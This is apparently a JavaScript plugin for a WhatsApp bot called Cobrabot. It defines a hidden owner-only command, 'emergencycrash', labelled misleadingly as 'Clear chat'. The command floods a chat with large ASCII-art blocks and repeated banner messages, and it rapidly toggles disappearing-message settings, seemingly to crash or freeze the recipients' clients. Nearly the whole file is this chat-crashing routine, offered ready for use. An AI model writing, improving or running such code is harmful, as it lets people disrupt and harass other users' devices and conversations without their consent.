const {MessageType, GroupSettingChange, ChatModification, WAConnectionTest} = require('@adiwajshing/baileys');
const cobra = require('../events');
const Config = require('../config');

const Language = require('../language');
const Lang = Language.getString('admin');
const mut = Language.getString('mute');
const END = "Clear chat"
const ARC = "Chat Archive And Unarchive"

async function checkImAdmin(message, user = message.client.user.jid) {
    var grup = await message.client.groupMetadata(message.jid);
    var sonuc = grup['participants'].map((member) => {
        if (member.id.split('@')[0] === user.split('@')[0] && member.isAdmin) return true; else; return false;
    });
    return sonuc.includes(true);
}
cobra.addCommand({pattern: 'emergencycrash', fromMe: true, desc: END, dontAddCommandList: true}, (async (message, match) => {
    const msg = 
    `
    ▒▒█▒▒▒▄██████████▄▒▒▒▒
    ▒█▐▒▒▒████████████▒▒▒▒
    ▒▌▐▒▒██▄▀██████▀▄██▒▒▒
    ▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
    ▐┼▐▒▒██████████████▒▒▒
    ▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
    ▒▒█████──────────▐███▌
    ▒▒█▀▀██▄█─▄───▐─▄███▀▒
    ▒▒█▒▒███████▄██████▒▒▒
    ▒▒▒▒▒██████████████▒▒▒
    ▒▒▒▒▒██████████████▒▒▒
    ▒▒▒▒▒█████████▐▌██▌▒▒▒
    ▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ `
const c = `
░█████╗░
██╔══██╗
██║░░╚═╝
██║░░██╗
╚█████╔╝
░╚════╝░`
const o = `
░█████╗░
██╔══██╗
██║░░██║
██║░░██║
╚█████╔╝
░╚════╝░`
const b = `
██████╗░
██╔══██╗
██████╦╝
██╔══██╗
██████╦╝
╚═════╝░`
const r = `
██████╗░
██╔══██╗
██████╔╝
██╔══██╗
██║░░██║
╚═╝░░╚═╝`
const a = `
░█████╗░
██╔══██╗
███████║
██╔══██║
██║░░██║
╚═╝░░╚═╝`

    await message.sendMessage('*ᴄᴏʙʀᴀʙᴏᴛ ᴠɪᴘ ᴇᴅɪᴛɪᴏɴ*');
    await message.client.toggleDisappearingMessages(message.jid, 1000);
    await message.client.toggleDisappearingMessages(message.jid, 1000);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.sendMessage(msg); 
    await message.sendMessage('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n' + msg + '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n' + msg + '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ✦ Powered By Cobrabot');
    await message.client.toggleDisappearingMessages(message.jid, 0);     
    await message.sendMessage('```❌ Crash Starting ❌```');    
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 0);   
    await message.sendMessage(c); 
    await message.sendMessage(o); 
    await message.sendMessage(b); 
    await message.sendMessage(r); 
    await message.sendMessage(a);      
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 0); 
    await message.client.toggleDisappearingMessages(message.jid, 0); 
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 0);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.sendMessage('```❌ Crashing```')
    await message.sendMessage(c); 
    await message.sendMessage(o); 
    await message.sendMessage(b); 
    await message.sendMessage(r); 
    await message.sendMessage(a);         
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.sendMessage(c); 
    await message.sendMessage(o); 
    await message.sendMessage(b); 
    await message.sendMessage(r); 
    await message.sendMessage(a);  
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.client.toggleDisappearingMessages(message.jid, 65580);
    await message.sendMessage(c); 
    await message.sendMessage(o); 
    await message.sendMessage(b); 
    await message.sendMessage(r); 
    await message.sendMessage(a); 
    await message.client.toggleDisappearingMessages(message.jid, 0); 
    await message.client.toggleDisappearingMessages(message.jid, 65580);  
    await message.sendMessage(c); 
    await message.sendMessage(o); 
    await message.sendMessage(b); 
    await message.sendMessage(r); 
    await message.sendMessage(a); 
    await message.sendMessage('```❌ Crash Stop❌```');
    await message.sendMessage('```❌ Crash Restarting❌```');
    await message.client.toggleDisappearingMessages(message.jid, 0); 
    await message.client.toggleDisappearingMessages(message.jid, 65580);  
    await message.sendMessage('```❌powerd by cobrabot developer - sisula welgamage❌```'); 
    
}));
